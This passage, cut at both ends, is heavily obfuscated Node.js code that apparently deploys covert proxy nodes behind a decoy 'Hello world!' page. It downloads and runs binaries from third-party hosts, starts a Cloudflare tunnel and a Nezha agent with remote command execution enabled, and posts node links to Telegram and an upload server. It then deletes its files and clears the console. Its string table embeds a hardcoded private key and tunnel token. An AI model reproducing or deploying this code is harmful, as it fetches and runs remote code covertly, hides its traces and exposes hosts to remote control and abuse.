    ;(await exec(_0x553540), console[_0x256030(0x1e1)](webName + _0x256030(0x2e6)), await new Promise((_0x7f6531) => setTimeout(_0x7f6531, 0x3e8)))
  } catch (_0x1c11c9) {
    console[_0x256030(0x1f1)](_0x256030(_0x25b412._0x228623) + _0x1c11c9)
  }
  if (fs[_0x256030(0x23a)](botPath)) {
    let _0x12c48f
    if (ARGO_AUTH[_0x256030(0x1f5)](/^[A-Z0-9a-z=]{120,250}$/)) _0x12c48f = _0x256030(_0x25b412._0x45cf4c) + ARGO_AUTH
    else
      ARGO_AUTH['match'](/TunnelSecret/)
        ? (_0x12c48f =
            'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22' +
            path[_0x256030(_0x25b412._0x46cf34)](FILE_PATH, 'tunnel.yml') +
            _0x256030(_0x25b412._0x1d1db1))
        : (_0x12c48f = _0x256030(_0x25b412._0x35a8f8) + path['resolve'](bootLogPath) + _0x256030(_0x25b412._0x5e1750) + ARGO_PORT)
    try {
      ;(await exec('nohup\x20\x22' + path[_0x256030(0x29d)](botPath) + '\x22\x20' + _0x12c48f + _0x256030(0x21d)),
        console[_0x256030(_0x25b412._0x240493)](botName + _0x256030(_0x25b412._0x2e9574)),
        await new Promise((_0x2237f3) => setTimeout(_0x2237f3, 0x7d0)))
    } catch (_0x1de83f) {
      console['error']('Error\x20executing\x20command:\x20' + _0x1de83f)
    }
  }
  await new Promise((_0x419167) => setTimeout(_0x419167, 0x1388))
}
function getFilesForArchitecture(_0x4c6438) {
  const _0x34e23d = { _0x54a0aa: 0x2d9, _0x2b6217: 0x1ea, _0x218811: 0x213, _0x3665f3: 0x264 },
    _0x521f2f = _0x4f0683,
    _0xadd1db = _0x4c6438 === _0x521f2f(0x2df) ? _0x521f2f(_0x34e23d._0x54a0aa) : _0x521f2f(0x1de),
    _0x4fcafd = _0x4c6438 === 'arm' ? _0x521f2f(0x2b5) : _0x521f2f(0x23c),
    _0x5798ec = [
      { fileName: webPath, fileUrls: [_0xadd1db + _0x521f2f(0x1ea), _0x4fcafd + _0x521f2f(_0x34e23d._0x2b6217)] },
      { fileName: botPath, fileUrls: [_0xadd1db + _0x521f2f(0x28c), _0x4fcafd + '/bot'] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x5798ec[_0x521f2f(_0x34e23d._0x218811)]({
            fileName: npmPath,
            fileUrls: [_0xadd1db + _0x521f2f(_0x34e23d._0x3665f3), _0x4fcafd + '/agent']
          })
        : _0x5798ec[_0x521f2f(0x213)]({ fileName: phpPath, fileUrls: [_0xadd1db + '/v1', _0x4fcafd + _0x521f2f(0x1fd)] })),
    _0x5798ec
  )
}
function argoType() {
  const _0x2a9d7f = { _0x17634e: 0x26c, _0x31a277: 0x229, _0x1dcac0: 0x257, _0x342ec7: 0x2c7, _0x2e7684: 0x1e0, _0x31c25a: 0x229 },
    _0x493b46 = _0x4f0683
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x493b46(0x1e1)](_0x493b46(0x227))
    return
  }
  if (ARGO_AUTH['includes'](_0x493b46(_0x2a9d7f._0x17634e))) {
    fs[_0x493b46(0x1e0)](path[_0x493b46(_0x2a9d7f._0x31a277)](FILE_PATH, 'tunnel.json'), ARGO_AUTH)
    const _0x5c2a0e =
      _0x493b46(_0x2a9d7f._0x1dcac0) +
      ARGO_AUTH[_0x493b46(0x210)]('\x22')[0xb] +
      '\x0a\x20\x20credentials-file:\x20' +
      path[_0x493b46(0x229)](FILE_PATH, 'tunnel.json') +
      '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
      ARGO_DOMAIN +
      _0x493b46(0x20d) +
      ARGO_PORT +
      _0x493b46(_0x2a9d7f._0x342ec7)
    fs[_0x493b46(_0x2a9d7f._0x2e7684)](path[_0x493b46(_0x2a9d7f._0x31c25a)](FILE_PATH, 'tunnel.yml'), _0x5c2a0e)
  } else console[_0x493b46(0x1e1)]('Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20' + ARGO_PORT + '\x20in\x20clouudflare')
}
async function waitForQuickTunnelLog(_0x6d0c09 = 0x7530) {
  const _0x302c74 = { _0xa347ce: 0x26b, _0x5e0be5: 0x23a, _0x358bf9: 0x2c2 },
    _0x5ce3b4 = _0x4f0683,
    _0x2c4102 = Date[_0x5ce3b4(_0x302c74._0xa347ce)]() + _0x6d0c09
  while (Date['now']() < _0x2c4102) {
    try {
      if (fs[_0x5ce3b4(_0x302c74._0x5e0be5)](bootLogPath)) {
        const _0x5b26c2 = fs[_0x5ce3b4(0x277)](bootLogPath, _0x5ce3b4(_0x302c74._0x358bf9))
        if (/trycloudflare\.com/[_0x5ce3b4(0x1e3)](_0x5b26c2)) return _0x5b26c2
      }
    } catch (_0x5d304b) {}
    await new Promise((_0xbe2870) => setTimeout(_0xbe2870, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0xa583a0 = {
      _0x41351c: 0x278,
      _0xaeaadc: 0x1e1,
      _0x21602a: 0x2d3,
      _0x54b989: 0x1ee,
      _0x30831f: 0x2ae,
      _0x414863: 0x29d,
      _0x318654: 0x1eb,
      _0x4da491: 0x230,
      _0x556793: 0x2b1
    },
    _0x4c1f54 = { _0x51a65b: 0x260, _0x4888d7: 0x1f6 },
    _0x459497 = _0x4f0683
  let _0x392c3c
  if (ARGO_AUTH && ARGO_DOMAIN)
    ((_0x392c3c = ARGO_DOMAIN), console[_0x459497(0x1e1)](_0x459497(_0xa583a0._0x41351c), _0x392c3c), await generateLinks(_0x392c3c))
  else
    try {
      const _0x1a51c6 = await waitForQuickTunnelLog(),
        _0x1b9d4b = _0x1a51c6[_0x459497(0x210)]('\x0a'),
        _0x24abe8 = []
      _0x1b9d4b[_0x459497(0x1d3)]((_0x464451) => {
        const _0x519a85 = _0x464451['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x519a85) {
          const _0x5f0a66 = _0x519a85[0x1]
          _0x24abe8['push'](_0x5f0a66)
        }
      })
      if (_0x24abe8['length'] > 0x0)
        ((_0x392c3c = _0x24abe8[0x0]),
          console[_0x459497(_0xa583a0._0xaeaadc)](_0x459497(_0xa583a0._0x21602a), _0x392c3c),
          await generateLinks(_0x392c3c))
      else {
        ;(console['log'](_0x459497(0x1d6)), fs[_0x459497(0x2a6)](path[_0x459497(0x229)](FILE_PATH, _0x459497(_0xa583a0._0x54b989))))
        async function _0x454f4a() {
          const _0x3559d3 = _0x459497
          try {
            process[_0x3559d3(0x224)] === _0x3559d3(_0x4c1f54._0x51a65b)
              ? await exec('taskkill\x20/f\x20/im\x20' + botName + '.exe\x20>\x20nul\x202>&1')
              : await exec(
                  _0x3559d3(0x258) + botName['charAt'](0x0) + ']' + botName[_0x3559d3(_0x4c1f54._0x4888d7)](0x1) + '\x22\x20>\x20/dev/null\x202>&1'
                )
          } catch (_0x56336d) {}
        }
        ;(_0x454f4a(), await new Promise((_0x2803fc) => setTimeout(_0x2803fc, 0xbb8)))
        const _0x55ab67 =
          _0x459497(_0xa583a0._0x30831f) + path[_0x459497(_0xa583a0._0x414863)](bootLogPath) + _0x459497(_0xa583a0._0x318654) + ARGO_PORT
        try {
          ;(await exec(_0x459497(_0xa583a0._0x4da491) + path[_0x459497(0x29d)](botPath) + '\x22\x20' + _0x55ab67 + '\x20>/dev/null\x202>&1\x20&'),
            console['log'](botName + '\x20is\x20running'),
            await new Promise((_0x25331c) => setTimeout(_0x25331c, 0x1770)),
            await extractDomains())
        } catch (_0x1826fa) {
          console['error'](_0x459497(_0xa583a0._0x556793) + _0x1826fa)
        }
      }
    } catch (_0x2af990) {
      console['error'](_0x459497(0x29c), _0x2af990)
    }
}
async function getMetaInfo() {
  const _0x2e5bd4 = {
      _0x357190: 0x2af,
      _0x4cebcc: 0x24d,
      _0x1472df: 0x269,
      _0x322cb6: 0x2db,
      _0x355bbf: 0x1d2,
      _0x5e46f8: 0x2e2,
      _0x447a9b: 0x234,
      _0x4ae254: 0x24d,
      _0x5d8018: 0x236
    },
    _0x39a3ee = _0x4f0683
  try {
    const _0x52d50e = await axios[_0x39a3ee(0x1d2)](_0x39a3ee(0x1dc), { headers: { 'User-Agent': _0x39a3ee(_0x2e5bd4._0x357190), timeout: 0xbb8 } })
    if (
      _0x52d50e[_0x39a3ee(_0x2e5bd4._0x4cebcc)] &&
      _0x52d50e['data'][_0x39a3ee(_0x2e5bd4._0x1472df)] &&
      _0x52d50e[_0x39a3ee(0x24d)][_0x39a3ee(_0x2e5bd4._0x322cb6)]
    )
      return (_0x52d50e[_0x39a3ee(_0x2e5bd4._0x4cebcc)][_0x39a3ee(0x269)] + '-' + _0x52d50e[_0x39a3ee(0x24d)][_0x39a3ee(0x2db)])[_0x39a3ee(0x236)](
        /\s+/g,
        '_'
      )
  } catch (_0x49c877) {
    try {
      const _0x228a3b = await axios[_0x39a3ee(_0x2e5bd4._0x355bbf)](_0x39a3ee(_0x2e5bd4._0x5e46f8), {
        headers: { 'User-Agent': 'Mozilla/5.0', timeout: 0xbb8 }
      })
      if (
        _0x228a3b[_0x39a3ee(_0x2e5bd4._0x4cebcc)] &&
        _0x228a3b[_0x39a3ee(0x24d)]['status'] === 'success' &&
        _0x228a3b[_0x39a3ee(0x24d)][_0x39a3ee(0x234)] &&
        _0x228a3b[_0x39a3ee(0x24d)][_0x39a3ee(0x250)]
      )
        return (_0x228a3b['data'][_0x39a3ee(_0x2e5bd4._0x447a9b)] + '-' + _0x228a3b[_0x39a3ee(_0x2e5bd4._0x4ae254)][_0x39a3ee(0x250)])[
          _0x39a3ee(_0x2e5bd4._0x5d8018)
        ](/\s+/g, '_')
    } catch (_0x36c484) {}
  }
  return _0x39a3ee(0x25d)
}
async function getServerIP() {
  const _0x59c294 = {
      _0x4134a6: 0x282,
      _0x3348f6: 0x24d,
      _0x3600d8: 0x279,
      _0xc96d96: 0x1dd,
      _0x2a63e4: 0x25b,
      _0x51bb52: 0x2e7,
      _0x57b85a: 0x27d,
      _0x5ac1f8: 0x28b
    },
    _0x56faf3 = _0x4f0683
  let _0x248d62 = ''
  try {
    const _0x1e5879 = await axios[_0x56faf3(0x1d2)](_0x56faf3(_0x59c294._0x4134a6), { timeout: 0xbb8 })
    _0x248d62 = _0x1e5879[_0x56faf3(_0x59c294._0x3348f6)]['trim']()
  } catch (_0x8b92f4) {
    try {
      _0x248d62 = execSync(_0x56faf3(_0x59c294._0x3600d8))[_0x56faf3(_0x59c294._0xc96d96)]()['trim']()
    } catch (_0x2e62f4) {
      try {
        const _0x2cba83 = await axios[_0x56faf3(0x1d2)](_0x56faf3(0x1f7), { timeout: 0xbb8 })
        _0x248d62 = '[' + _0x2cba83[_0x56faf3(0x24d)][_0x56faf3(_0x59c294._0x2a63e4)]() + ']'
      } catch (_0x2dbad6) {
        try {
          _0x248d62 = '[' + execSync(_0x56faf3(_0x59c294._0x51bb52))['toString']()[_0x56faf3(_0x59c294._0x2a63e4)]() + ']'
        } catch (_0x3c15b0) {
          console[_0x56faf3(0x1f1)](_0x56faf3(_0x59c294._0x57b85a), _0x3c15b0[_0x56faf3(_0x59c294._0x5ac1f8)])
        }
      }
    }
  }
  return _0x248d62
}
function _0x2251() {
  const _0x3090cb = [
    '\x20-c\x20',
    'slice',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    'ArgoDomain:',
    'Download\x20',
    '\x0asocks://',
    '7575949494',
    's5-in',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'https://arm64.oooen.com',
    'http',
    'isp',
    'stringify',
    '116800OSgTBJ',
    '180233cd-22c9-4144-a559-012e45986dd6',
    'arm',
    '?encryption=none&security=tls&sni=',
    'writeHead',
    'http://ip-api.com/json',
    'raw',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    'SHOW_LOG',
    '\x20is\x20running',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    '8902240cNcApy',
    'crypto',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'base64url',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'subarray',
    '8443',
    '124860hBluUl',
    'includes',
    '/api/add-nodes',
    'App\x20is\x20running',
    'fileUrls',
    'response',
    'disable',
    'get',
    'forEach',
    '286986RNKykV',
    'createHash',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'vless-ws-in',
    'Public\x20Key:',
    'createServer',
    'trojan',
    'NAME',
    'https://api.ip.sb/geoip',
    'toString',
    'https://amd64.oooen.com',
    'ignore',
    'writeFileSync',
    'log',
    '\x0a\x0avmess://',
    'test',
    'clear',
    '2096',
    'ARGO_PORT',
    'vless-in',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'ARGO_AUTH',
    '/web',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'statSync',
    'Private\x20Key:',
    'boot.log',
    '-----END\x20CERTIFICATE-----\x0a',
    'HY2_PORT',
    'error',
    'string',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'der',
    'match',
    'substring',
    'http://ipv6.ip.sb',
    'direct',
    'promises',
    'unlink',
    'filter',
    'abcdefghijklmnopqrstuvwxyz',
    '/v1',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'MarkdownV2',
    'pipe',
    'has',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    '/api/delete-nodes',
    'utf8',
    '\x20successfully',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    'length',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'all',
    'hex',
    'publicKey',
    'catch',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'vless',
    'dirname',
    'split',
    '\x0a\x20\x20\x20\x20',
    '\x0ahysteria2://',
    'unshift',
    '2087',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    '&pinSHA256=',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    'arm64',
    'sha256',
    'base64',
    'CFIP',
    '\x20>/dev/null\x202>&1\x20&',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'ARGO_DOMAIN',
    'xtls-rprx-vision',
    '/vless-argo',
    'status',
    'floor',
    'platform',
    'index.html',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'application/json',
    'join',
    '\x20failed:\x20',
    'fileName',
    'axios',
    'renameSync',
    'listen',
    'PORT',
    'nohup\x20\x22',
    '/trojan-argo',
    'child_process',
    '\x22\x20run',
    'countryCode',
    'socks',
    'replace',
    'reality',
    '7OdhbrL',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'existsSync',
    '&type=tcp&headerType=none#',
    'https://amd64.ssss.nyc.mn',
    'auto',
    '2498nbCVdv',
    'createWriteStream',
    'PROJECT_URL',
    'NEZHA_SERVER',
    'password',
    'config.json',
    '443',
    '200Wjedrw',
    'private.key',
    '2083',
    'isFile',
    'spki',
    'REALITY_PORT',
    '127.0.0.1',
    '4214408ykHSru',
    'data',
    'SUB_PATH',
    '\x22\x20-out\x20\x22',
    'org',
    'post',
    '/api/add-subscriptions',
    'UPLOAD_URL',
    'php\x20running\x20error:\x20',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'push',
    '\x0a\x20\x20tunnel:\x20',
    'pkill\x20-f\x20\x22[',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'text/html;\x20charset=utf-8',
    'trim',
    '&fp=firefox&type=ws&host=',
    'Unknown',
    'Subscription\x20uploaded\x20successfully',
    'mkdirSync',
    'win32',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'list.txt',
    'digest',
    '/agent',
    'CHAT_ID',
    'deployzy.933993.xyz',
    '\x5c$&',
    'nohup\x20',
    'country_code',
    'PrivateKey:\x20',
    'now',
    'TunnelSecret',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    '\x20-p\x20',
    'hysteria',
    'Not\x20Found',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    '\x20from\x20backup\x20source',
    'cert.pem',
    '/sub.txt\x20saved\x20successfully',
    'block',
    'Nodes\x20uploaded\x20successfully',
    'readFileSync',
    'ARGO_DOMAIN:',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    '\x0aclient_secret:\x20',
    'key.txt',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    'Failed\x20to\x20get\x20IP\x20address:',
    'toLowerCase',
    'www.iij.ad.jp:443',
    'BggqhkjOPQMBBw==\x0a',
    'export',
    'http://ipv4.ip.sb',
    'FILE_PATH',
    'readFile',
    '\x20>/dev/null\x202>&1',
    'config.yaml',
    '\x0aPublicKey:\x20',
    'update',
    '/dev/null',
    '1056566JTolLI',
    'message',
    '/bot',
    'Empowerment\x20failed\x20for\x20',
    'npm\x20running\x20error:\x20',
    'end',
    '/vmess-argo',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
    '996aIpcrT',
    '2053',
    'aarch64',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    'url',
    '\x20-s\x20',
    'basename',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'freedom',
    'NEZHA_PORT',
    'Error\x20reading\x20boot.log:',
    'resolve',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'tcp',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    'false',
    'finish',
    'web\x20running\x20error:\x20',
    'vless-tcp-in',
    'hysteria-in',
    'unlinkSync',
    '/vmess-argo?ed=2560',
    '171aCJcUm',
    'charAt',
    '节点推送**\x0a```',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    'from',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'Mozilla/5.0',
    'Retrying\x20',
    'Error\x20executing\x20command:\x20',
    'vmess',
    'https://oooo.serv00.net/add-url',
    'Error\x20downloading\x20files:',
    'https://arm64.ssss.nyc.mn',
    '\x0avless://',
    'quic',
    '\x20-c\x20\x22',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'CFPORT',
    'text/plain;\x20charset=utf-8',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    'Telegram\x20message\x20sent\x20successfully',
    'Error\x20in\x20startserver:',
    'path',
    'inbounds',
    'utf-8',
    'env',
    'https+local://8.8.8.8/dns-query',
    'random',
    'none',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    'mfa.gov.ua',
    'NEZHA_KEY',
    'tls',
    '\x20>\x20nul\x202>&1',
    'Unhandled\x20error\x20in\x20startserver:',
    'then',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'
  ]
  _0x2251 = function () {
    return _0x3090cb
  }
  return _0x2251()
}
async function generateLinks(_0x4a65c2) {
  const _0xc8c71 = await getMetaInfo(),
    _0x25a604 = NAME ? NAME + '-' + _0xc8c71 : _0xc8c71,
    _0x7127ea = await getServerIP()
  return new Promise((_0x59d81b) => {
    const _0x521ed3 = {
      _0x228102: 0x2b6,
      _0x290ff5: 0x25c,
      _0x4e2675: 0x259,
      _0x5ea7a3: 0x1e2,
      _0xd1d9be: 0x2dc,
      _0x2e4c50: 0x25c,
      _0x4c910e: 0x216,
      _0x3d3803: 0x27c,
      _0xca333c: 0x2d1,
      _0x37cdfe: 0x21b,
      _0x37fb0f: 0x1e1,
      _0x20d740: 0x1e0,
      _0x1443e5: 0x2ac,
      _0x303e1a: 0x204,
      _0x2bd9b8: 0x274,
      _0x504db1: 0x21b
    }
    setTimeout(() => {
      const _0x219242 = _0x1f2b,
        _0x4eb53a = {
          v: '2',
          ps: '' + _0x25a604,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x219242(0x23d),
          net: 'ws',
          type: _0x219242(0x2c6),
          host: _0x4a65c2,
          path: _0x219242(0x2a7),
          tls: _0x219242(0x2cb),
          sni: _0x4a65c2,
          alpn: '',
          fp: 'firefox'
        }
      let _0x3d7b93 =
        _0x219242(_0x521ed3._0x228102) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x219242(0x2e0) +
        _0x4a65c2 +
        _0x219242(_0x521ed3._0x290ff5) +
        _0x4a65c2 +
        _0x219242(_0x521ed3._0x4e2675) +
        _0x25a604 +
        _0x219242(_0x521ed3._0x5ea7a3) +
        Buffer[_0x219242(0x2ac)](JSON[_0x219242(_0x521ed3._0xd1d9be)](_0x4eb53a))[_0x219242(0x1dd)](_0x219242(0x21b)) +
        '\x0a\x0atrojan://' +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?security=tls&sni=' +
        _0x4a65c2 +
        _0x219242(_0x521ed3._0x2e4c50) +
        _0x4a65c2 +
        '&path=%2Ftrojan-argo%3Fed%3D2560#' +
        _0x25a604 +
        _0x219242(0x211)
      if (isValidPort(HY2_PORT)) {
        const _0x1a6c67 = getCertificateFingerprint(certPath),
          _0x4095c8 = _0x1a6c67 ? _0x219242(_0x521ed3._0x4c910e) + encodeURIComponent(_0x1a6c67) : '',
          _0x186fb7 = _0x219242(0x212) + UUID + '@' + _0x7127ea + ':' + HY2_PORT + _0x219242(_0x521ed3._0x3d3803) + _0x4095c8 + '#' + _0x25a604
        _0x3d7b93 += _0x186fb7
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x211313 = '\x0avless://' + UUID + '@' + _0x7127ea + ':' + REALITY_PORT + _0x219242(0x2a0) + publicKey + _0x219242(0x23b) + _0x25a604
        _0x3d7b93 += _0x211313
      }
      if (isValidPort(S5_PORT)) {
        const _0x625e92 = Buffer[_0x219242(0x2ac)](UUID[_0x219242(0x1f6)](0x0, 0x8) + ':' + UUID[_0x219242(_0x521ed3._0xca333c)](-0xc))[
            _0x219242(0x1dd)
          ](_0x219242(_0x521ed3._0x37cdfe)),
          _0xd52ea6 = _0x219242(0x2d5) + _0x625e92 + '@' + _0x7127ea + ':' + S5_PORT + '#' + _0x25a604
        _0x3d7b93 += _0xd52ea6
      }
      ;(console[_0x219242(_0x521ed3._0x37fb0f)](Buffer['from'](_0x3d7b93)['toString'](_0x219242(0x21b))),
        fs[_0x219242(_0x521ed3._0x20d740)](subPath, Buffer[_0x219242(_0x521ed3._0x1443e5)](_0x3d7b93)[_0x219242(0x1dd)](_0x219242(0x21b))),
        fs['writeFileSync'](listPath, _0x3d7b93, _0x219242(_0x521ed3._0x303e1a)),
        console[_0x219242(0x1e1)](FILE_PATH + _0x219242(_0x521ed3._0x2bd9b8)),
        (subContent = Buffer[_0x219242(0x2ac)](_0x3d7b93)[_0x219242(0x1dd)](_0x219242(_0x521ed3._0x504db1))),
        uploadNodes(),
        _0x59d81b(_0x3d7b93))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x220372 = {
      _0xf09b22: 0x228,
      _0x1abf5d: 0x25e,
      _0x24f33b: 0x222,
      _0x1a5916: 0x23a,
      _0x2f905f: 0x1fb,
      _0x712baf: 0x251,
      _0x4decb5: 0x1e1,
      _0x5554ee: 0x276
    },
    _0x1547e3 = _0x4f0683
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x47b451 = PROJECT_URL + '/' + SUB_PATH,
      _0x50de3d = { subscription: [_0x47b451] }
    try {
      const _0x4893f5 = await axios[_0x1547e3(0x251)](UPLOAD_URL + _0x1547e3(0x252), _0x50de3d, {
        headers: { 'Content-Type': _0x1547e3(_0x220372._0xf09b22) }
      })
      return _0x4893f5 && _0x4893f5[_0x1547e3(0x222)] === 0xc8 ? (console[_0x1547e3(0x1e1)](_0x1547e3(_0x220372._0x1abf5d)), _0x4893f5) : null
    } catch (_0x5d6571) {
      if (_0x5d6571[_0x1547e3(0x1d0)]) {
        if (_0x5d6571[_0x1547e3(0x1d0)][_0x1547e3(_0x220372._0x24f33b)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0x1547e3(_0x220372._0x1a5916)](listPath)) return
      const _0x186129 = fs[_0x1547e3(0x277)](listPath, 'utf-8'),
        _0x4db88d = _0x186129[_0x1547e3(0x210)]('\x0a')[_0x1547e3(_0x220372._0x2f905f)]((_0x557527) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x1547e3(0x1e3)](_0x557527)
        )
      if (_0x4db88d['length'] === 0x0) return
      const _0x362252 = JSON[_0x1547e3(0x2dc)]({ nodes: _0x4db88d })
      try {
        const _0x1f7f49 = await axios[_0x1547e3(_0x220372._0x712baf)](UPLOAD_URL + _0x1547e3(0x1cd), _0x362252, {
          headers: { 'Content-Type': _0x1547e3(_0x220372._0xf09b22) }
        })
        return _0x1f7f49 && _0x1f7f49['status'] === 0xc8 ? (console[_0x1547e3(_0x220372._0x4decb5)](_0x1547e3(_0x220372._0x5554ee)), _0x1f7f49) : null
      } catch (_0x38ef2b) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  const _0x531b71 = { _0x290e5f: 0x2cc, _0x549de6: 0x229 },
    _0x2765e1 = { _0x382254: 0x1ce }
  setTimeout(() => {
    const _0x447396 = { _0x17ee52: 0x29e },
      _0x43c0ff = _0x1f2b,
      _0x337e66 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x337e66[_0x43c0ff(0x256)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x337e66[_0x43c0ff(0x256)](phpPath)
    process['platform'] === 'win32'
      ? exec('del\x20/f\x20/q\x20' + _0x337e66[_0x43c0ff(0x229)]('\x20') + _0x43c0ff(_0x531b71._0x290e5f), (_0x11a158) => {
          const _0x116c95 = _0x43c0ff
          ;(console['clear'](), alwaysLog(_0x116c95(0x1ce)), console['log'](_0x116c95(_0x447396._0x17ee52)))
        })
      : exec('rm\x20-rf\x20' + _0x337e66[_0x43c0ff(_0x531b71._0x549de6)]('\x20') + _0x43c0ff(0x285), (_0x58e1eb) => {
          const _0x263210 = _0x43c0ff
          ;(console[_0x263210(0x1e4)](), alwaysLog(_0x263210(_0x2765e1._0x382254)), console[_0x263210(0x1e1)](_0x263210(0x29e)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x1a5ae4 = { _0x33d086: 0x2ba, _0x573a3e: 0x277, _0x57d2eb: 0x2aa, _0x1b5ea4: 0x251, _0x2fcaac: 0x2be },
    _0x3ed327 = _0x4f0683
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x3ed327(0x1e1)](_0x3ed327(_0x1a5ae4._0x33d086))
    return
  }
  try {
    const _0x2f66c8 = fs[_0x3ed327(_0x1a5ae4._0x573a3e)](subPath, 'utf8'),
      _0x4e2c5a = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
      _0x21b85f = NAME[_0x3ed327(0x236)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x3ed327(0x267)),
      _0x56b0ba = { chat_id: CHAT_ID, text: '**' + _0x21b85f + _0x3ed327(_0x1a5ae4._0x57d2eb) + _0x2f66c8 + '```', parse_mode: _0x3ed327(0x1ff) }
    ;(await axios[_0x3ed327(_0x1a5ae4._0x1b5ea4)](_0x4e2c5a, null, { params: _0x56b0ba }), console[_0x3ed327(0x1e1)](_0x3ed327(_0x1a5ae4._0x2fcaac)))
  } catch (_0x4299e5) {
